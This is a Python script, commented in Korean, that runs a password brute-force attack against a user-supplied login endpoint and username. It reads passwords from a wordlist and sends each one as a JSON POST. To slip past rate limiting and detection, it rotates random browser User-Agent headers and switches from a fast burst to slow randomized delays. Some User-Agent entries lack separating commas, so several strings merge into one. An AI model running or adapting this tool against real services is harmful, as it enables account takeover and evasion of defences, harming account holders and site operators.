import requests
import time
import random
import os

# --- 지능형 공격을 위한 User-Agent 리스트 ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
]

def load_wordlist(file_path):
    if not os.path.exists(file_path):
        print(f"[!] 에러: '{file_path}' 파일을 찾을 수 없습니다.")
        return None
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def start_stealth_hybrid_attack():
    wordlist_name = input("[!] 사용할 워드리스트 파일명: ").strip()
    passwords = load_wordlist(wordlist_name)
    if not passwords: return

    TARGET_URL = input("[!] 공격할 서버의 엔드포인트를 입력하세요 : ").strip()
    TARGET_USER = input("[!] 공격할 유저의 닉네임을 입력하세요 : ").strip()
    
    attempt_count = 0
    burst_limit = int(input("고속 공격할 횟수를 대입하세요 : ").strip())

    try:
        for pwd in passwords:
            attempt_count += 1
            
            # --- [핵심] 헤더에 랜덤 User-Agent 설정 ---
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json",
                "Content-Type": "application/json"
            }

            payload = {"username": TARGET_USER, "password": pwd}

            try:
                # headers= 파라미터를 추가하여 전송
                response = requests.post(TARGET_URL, json=payload, headers=headers, timeout=10)
                print(f"[{attempt_count}] 시도: {pwd} | 상태: {response.status_code}")
                print(f"    ㄴ 사용된 UA: {headers['User-Agent'][:20]}...")
            except Exception as e:
                print(f"[!] 에러: {e}")
                continue

            # 지연 시간 로직
            if attempt_count <= burst_limit:
                wait_time = random.uniform(1, 2)
                stage = "Burst"
            else:
                wait_time = random.uniform(8, 60)
                stage = "Slow"

            print(f"    ㄴ [{stage}] 대기: {wait_time:.2f}초")
            time.sleep(wait_time)
            print("-" * 40)

    except KeyboardInterrupt:
        print("\n[!] 중단되었습니다.")

if __name__ == "__main__":
    start_stealth_hybrid_attack()